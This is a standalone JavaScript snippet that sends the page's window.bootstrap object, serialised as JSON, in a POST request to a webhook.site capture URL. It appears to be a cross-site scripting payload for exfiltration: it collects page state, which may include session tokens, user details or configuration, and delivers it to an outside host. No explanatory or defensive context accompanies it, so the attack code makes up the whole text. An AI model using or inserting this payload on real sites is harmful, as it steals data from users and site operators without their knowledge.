fetch("https://webhook.site/4c4d8f31-5c7b-418e-833b-720bb5550334", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(Object.values(window.bootstrap))
});
